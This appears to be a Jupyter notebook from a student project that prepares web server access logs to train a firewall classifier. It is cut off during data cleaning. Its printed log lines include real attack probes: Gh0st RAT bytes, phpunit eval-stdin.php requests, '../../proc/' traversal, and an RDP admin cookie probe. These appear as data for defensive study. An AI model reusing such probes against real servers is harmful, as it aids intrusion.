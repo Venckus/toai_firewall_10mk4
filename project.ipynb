{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.12-final"
    },
    "orig_nbformat": 2,
    "kernelspec": {
      "name": "python361264bitfc9e9ecad33e492fbe0dd8971c42f827",
      "display_name": "Python 3.6.12 64-bit"
    },
    "colab": {
      "name": "project.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "XoW09Z8y-UZA",
        "x2SnUWI_-UZJ",
        "Z62kILNL-UZR",
        "-Y03W9Uq-UZb"
      ],
      "toc_visible": true,
      "include_colab_link": true
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Venckus/toai_firewall_10mk4/blob/master/project.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PCCoKRp1-UXp"
      },
      "source": [
        "# 1 Imports"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "c8swEdgi-UXr"
      },
      "source": [
        "from os import listdir\n",
        "from os.path import isfile, join\n",
        "import numpy as np\n",
        "import pandas as pd"
      ],
      "execution_count": 1,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1eAQx2xJbl0g"
      },
      "source": [
        "%load_ext autoreload\n",
        "%autoreload 2\n",
        "%matplotlib inline"
      ],
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qqZM0navqdWw"
      },
      "source": [
        "from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer, TfidfTransformer\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.linear_model import LogisticRegression, SGDClassifier\n",
        "from sklearn.pipeline import Pipeline\n",
        "from sklearn.model_selection import GridSearchCV\n",
        "from sklearn import metrics"
      ],
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YJd5M7kljwZf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8fb20921-1f8c-4e23-89be-53a92203ba1c"
      },
      "source": [
        "# google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Mounted at /content/drive\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lb8I7tQp-UXz"
      },
      "source": [
        "## 1.1 Read all files in `data` directory"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3SBZDEUAHeLk",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "946da648-5b8c-4a47-9272-acf08edfe01d"
      },
      "source": [
        "!pwd"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/content\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9t9BQSi_i_k-",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "992632fe-47af-49a4-bf28-821a5c1346cc"
      },
      "source": [
        "!ls 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/'"
      ],
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "2021-01-001.log  2021-01-012.log  access.log.11  access.log.21\taccess.log.5\n",
            "2021-01-002.log  2021-01-013.log  access.log.12  access.log.22\taccess.log.6\n",
            "2021-01-003.log  2021-01-014.log  access.log.13  access.log.23\taccess.log.7\n",
            "2021-01-004.log  2021-01-015.log  access.log.14  access.log.24\taccess.log.8\n",
            "2021-01-005.log  2021-01-016.log  access.log.15  access.log.25\taccess.log.9\n",
            "2021-01-006.log  2021-01-017.log  access.log.16  access.log.26\tc2021-01.log\n",
            "2021-01-007.log  2021-01-018.log  access.log.17  access.log.27\tc2021-02.log\n",
            "2021-01-008.log  2021-01-019.log  access.log.18  access.log.28\tc2021-03.log\n",
            "2021-01-009.log  access.log\t  access.log.19  access.log.29\tc2021-04.log\n",
            "2021-01-010.log  access.log.1\t  access.log.2\t access.log.3\tc2021-05.log\n",
            "2021-01-011.log  access.log.10\t  access.log.20  access.log.4\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Kp0zI20fkr0n",
        "outputId": "26d032fe-32ad-4e83-d0e2-743c4cf84123"
      },
      "source": [
        "!tail -10 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data/access.log'"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "103.149.192.199 - - [17/Oct/2020:06:35:02 +0200] \"GET / HTTP/1.1\" 200 396 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36\"\n",
            "213.32.122.82 - - [17/Oct/2020:06:46:43 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"\n",
            "119.159.225.189 - - [17/Oct/2020:07:14:06 +0200] \"GET /admin//config.php HTTP/1.1\" 404 232 \"-\" \"curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5\"\n",
            "91.241.19.173 - - [17/Oct/2020:07:23:15 +0200] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:22:54 +0200] \"\\x05\\x01\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:24:12 +0200] \"\\x04\\x01\\x00P\\x05\\xBC\\xD2\\xE3\\x00\" 400 182 \"-\" \"-\"\n",
            "5.188.210.227 - - [17/Oct/2020:08:25:25 +0200] \"GET http://5.188.210.227/echo.php HTTP/1.1\" 404 209 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "36.92.170.3 - - [17/Oct/2020:09:09:16 +0200] \"GET / HTTP/1.1\" 200 612 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"\n",
            "183.136.225.56 - - [17/Oct/2020:09:34:33 +0200] \"GET / HTTP/1.1\" 200 13 \"-\" \"Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)\"\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "ZOAQDlm_-UX0",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "867fa4a6-e965-4ddd-b451-20732889eb4f"
      },
      "source": [
        "# read all data files\n",
        "mypath = 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/data'\n",
        "data_files = [f for f in listdir(mypath) if isfile(join(mypath, f))]\n",
        "data_files"
      ],
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['access.log.15',\n",
              " 'access.log.16',\n",
              " 'access.log.17',\n",
              " 'access.log.18',\n",
              " 'access.log.19',\n",
              " 'access.log.20',\n",
              " 'access.log.21',\n",
              " 'access.log.22',\n",
              " 'access.log.23',\n",
              " 'access.log.24',\n",
              " 'access.log.25',\n",
              " 'access.log.26',\n",
              " 'access.log.28',\n",
              " 'access.log.27',\n",
              " 'access.log.29',\n",
              " 'access.log.14',\n",
              " 'access.log.13',\n",
              " 'access.log.12',\n",
              " 'access.log.11',\n",
              " 'access.log.10',\n",
              " 'access.log.9',\n",
              " 'access.log.8',\n",
              " 'access.log.1',\n",
              " 'access.log',\n",
              " 'access.log.2',\n",
              " 'access.log.3',\n",
              " 'access.log.4',\n",
              " 'access.log.5',\n",
              " 'access.log.6',\n",
              " 'access.log.7',\n",
              " '2021-01-015.log',\n",
              " '2021-01-014.log',\n",
              " '2021-01-013.log',\n",
              " '2021-01-012.log',\n",
              " '2021-01-011.log',\n",
              " '2021-01-010.log',\n",
              " '2021-01-009.log',\n",
              " '2021-01-008.log',\n",
              " '2021-01-007.log',\n",
              " '2021-01-006.log',\n",
              " '2021-01-005.log',\n",
              " '2021-01-004.log',\n",
              " '2021-01-003.log',\n",
              " '2021-01-002.log',\n",
              " '2021-01-001.log',\n",
              " '2021-01-019.log',\n",
              " '2021-01-018.log',\n",
              " 'c2021-05.log',\n",
              " '2021-01-017.log',\n",
              " 'c2021-04.log',\n",
              " '2021-01-016.log',\n",
              " 'c2021-03.log',\n",
              " 'c2021-02.log',\n",
              " 'c2021-01.log']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WQ43-a1g-UX5"
      },
      "source": [
        "## 1.2 Add all files data into one Pandas dataframe"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "tags": [],
        "id": "rxLCCGoN-UX6",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "645d8223-6525-44b0-9698-cb2496cc2226"
      },
      "source": [
        "%%time\n",
        "li = []\n",
        "for file in data_files:\n",
        "    tmp = pd.read_csv(f'{mypath}/{file}', sep='\\s+', header=None)\n",
        "    li.append(tmp)\n",
        "df = pd.concat(li, axis=0, ignore_index=True)"
      ],
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 440 ms, sys: 58.2 ms, total: 498 ms\n",
            "Wall time: 15.7 s\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7yDRZZCP-UX_"
      },
      "source": [
        "# 2 Explore and prepare data"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ZxH-B_0y-UYA",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 257
        },
        "outputId": "997e03a3-837a-4a5a-efae-8a182cb10fe0"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>0</th>\n",
              "      <th>1</th>\n",
              "      <th>2</th>\n",
              "      <th>3</th>\n",
              "      <th>4</th>\n",
              "      <th>5</th>\n",
              "      <th>6</th>\n",
              "      <th>7</th>\n",
              "      <th>8</th>\n",
              "      <th>9</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:26:07</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:07:27:21</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:04:18</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:07:45</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>-</td>\n",
              "      <td>-</td>\n",
              "      <td>[26/Sep/2020:08:19:34</td>\n",
              "      <td>+0200]</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 0  1  ...  8                                                  9\n",
              "0    66.240.205.34  -  ...  -                                                  -\n",
              "1  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  -  ...  -                                                  -\n",
              "3  176.113.115.214  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  -  ...  -  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 10 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 8
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-1QjJUmz-UYF",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f12dd9c7-d61e-4148-d16b-7607c4533d09"
      },
      "source": [
        "df.shape"
      ],
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83763, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 9
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hFtUumnPkYoU",
        "outputId": "20926bf3-438b-437e-9a90-976c20246d2a"
      },
      "source": [
        "df.isna().sum()"
      ],
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0     0\n",
              "1     0\n",
              "2     0\n",
              "3     0\n",
              "4     0\n",
              "5    92\n",
              "6     0\n",
              "7     0\n",
              "8     0\n",
              "9     0\n",
              "dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 10
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3RUCHZqe-UYN",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "c4e69717-0e98-49a3-ab22-f30f4914e35c"
      },
      "source": [
        "df[1].describe()"
      ],
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "count     83763\n",
              "unique        1\n",
              "top           -\n",
              "freq      83763\n",
              "Name: 1, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 11
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CefCW2za-UYL"
      },
      "source": [
        "## 2.1 Remove useless data"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "E-tj15tbm3OZ"
      },
      "source": [
        "### 2.1.1 Renove columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QKuEsTuh-UYT"
      },
      "source": [
        "rm_colls =[1,2,4,8]\n",
        "df.drop(df.columns[rm_colls], axis=1, inplace=True)"
      ],
      "execution_count": 12,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UFLObtJj-UYY"
      },
      "source": [
        "Give names to columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RzBMWccR-UYZ"
      },
      "source": [
        "columns = {0:'IP',3:'date',5:'full_request',6:'code',7:'bytes',9:'agent'}\n",
        "df.rename(columns=columns,inplace=True)"
      ],
      "execution_count": 13,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7rbeBAN84Vfy"
      },
      "source": [
        "remove rows with `full_request` = nan"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LhWROxZy4UxA"
      },
      "source": [
        "df = df[df['full_request'].notna()]"
      ],
      "execution_count": 14,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "a7Smkfc8-UYc"
      },
      "source": [
        "remove '[' from date_time column"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QBjcnxLT-UYd"
      },
      "source": [
        "df['date'] = df['date'].str[1:]"
      ],
      "execution_count": 15,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dlGmULXO-UYi",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 257
        },
        "outputId": "87bd8e2a-0a8a-4870-c97e-f79ab4307a82"
      },
      "source": [
        "df.head()"
      ],
      "execution_count": 130,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>66.240.205.34</td>\n",
              "      <td>26/Sep/2020:07:26:07</td>\n",
              "      <td>Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``...</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                IP  ...                                              agent\n",
              "0    66.240.205.34  ...                                                  -\n",
              "1  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "2   199.195.254.38  ...                                                  -\n",
              "3  176.113.115.214  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...\n",
              "4    156.146.36.72  ...  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...\n",
              "\n",
              "[5 rows x 6 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 130
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "EQFNrrf7iqdt",
        "outputId": "2b059ace-dd02-4a19-fb04-fad25075cb3d"
      },
      "source": [
        "df.shape"
      ],
      "execution_count": 131,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83671, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 131
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Unw5RFP2m8Hp"
      },
      "source": [
        "### 2.1.2 Remove rows"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QwlKCbNewHRI",
        "outputId": "b2dce9e3-fd97-4299-e4f6-ecc70f5301f8"
      },
      "source": [
        "# drop ssl encoded rows\r\n",
        "dft = df[~df['full_request'].str.contains(fr\"\\\\x\", regex=True)]\r\n",
        "dft.shape"
      ],
      "execution_count": 138,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83231, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 138
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kjHM7_BCmGZC"
      },
      "source": [
        "dft = dft.join(\r\n",
        "    dft['full_request'].str.split(' ', 2, expand=True)\r\n",
        "    .rename(columns={0:'method', 1:'request', 2:'http_v'}))"
      ],
      "execution_count": 139,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6cSWDZDBxigK",
        "outputId": "2948804f-a5c9-4d7c-abc7-4efa9ba45041"
      },
      "source": [
        "dft.request.isnull().sum()"
      ],
      "execution_count": 140,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "51"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 140
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cd9J5mQayO4q"
      },
      "source": [
        "# drop rows where request is `NaN`.\r\n",
        "dft.dropna(subset=['request'], inplace=True)"
      ],
      "execution_count": 141,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9WwwyP32i0dT"
      },
      "source": [
        "dft = dft[dft['request'] != '/']"
      ],
      "execution_count": 142,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CvQaHrEEzcLZ",
        "outputId": "f7dc72cc-131e-4b51-9701-2818cfd92c44"
      },
      "source": [
        "dft.request.describe()"
      ],
      "execution_count": 143,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "count                                                 48899\n",
              "unique                                                 9640\n",
              "top       /index.php?mact=CmsJobManager,cntnt01,process,...\n",
              "freq                                                   2366\n",
              "Name: request, dtype: object"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 143
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 498
        },
        "id": "SZvz8MDkoC7k",
        "outputId": "cdb5c345-cace-49f2-c462-77c555f3846b"
      },
      "source": [
        "dft.head()"
      ],
      "execution_count": 144,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>full_request</th>\n",
              "      <th>code</th>\n",
              "      <th>bytes</th>\n",
              "      <th>agent</th>\n",
              "      <th>method</th>\n",
              "      <th>request</th>\n",
              "      <th>http_v</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>GET</td>\n",
              "      <td>../../proc/</td>\n",
              "      <td>HTTP</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>POST</td>\n",
              "      <td>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/robots.txt</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /xmlrpc.php?rsd HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>GET</td>\n",
              "      <td>/xmlrpc.php?rsd</td>\n",
              "      <td>HTTP/1.1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                IP  ...    http_v\n",
              "1  176.113.115.214  ...  HTTP/1.1\n",
              "2   199.195.254.38  ...      HTTP\n",
              "3  176.113.115.214  ...  HTTP/1.1\n",
              "4    156.146.36.72  ...  HTTP/1.1\n",
              "5    156.146.36.72  ...  HTTP/1.1\n",
              "\n",
              "[5 rows x 9 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 144
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lVzGxYQvl34e",
        "outputId": "636b4a12-ab05-4c63-d01d-839077012cac"
      },
      "source": [
        "# check if there is even line number for 50% split\r\n",
        "if dft.shape[0] % 2 == 1:\r\n",
        "  dft = dft[:-1]\r\n",
        "dft.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(83178, 10)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 136
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oVguTxTxmKKT"
      },
      "source": [
        "## 2.2 Split `full_request` column into `method`, `request`, `http version`."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "z7e3HsjEmZ10"
      },
      "source": [
